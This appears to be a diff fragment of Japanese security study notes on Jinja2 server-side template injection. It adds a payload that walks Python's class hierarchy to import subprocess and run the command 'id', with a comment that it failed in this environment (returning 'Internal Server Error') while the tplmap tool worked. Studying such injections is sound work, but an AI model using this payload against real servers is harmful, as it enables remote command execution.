@@ -677,9 +677,10 @@ Hello [<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class
 <class 'jinja2.ext.Extension'>, <class 'jinja2.ext._CommentFinder'>, <class 
 'unicodedata.UCD'>]! 
 ```
-- ``   
+- `"".__class__.__mro__[1].__subclasses__()[59].__repr__.__globals__.items()[13][1]["__import__"]("subprocess").check_output("id")`   
+どの経由でOSコマンドを実行してるのかよくわからんけど59番目のオブジェクトが欲しいやつがじゃないからうまく行ってない。環境依存。tplmapの方ではうまく行ってるが…   
 ```txt
-
+Internal Server Error
 ```
 - ``   
 ```txt
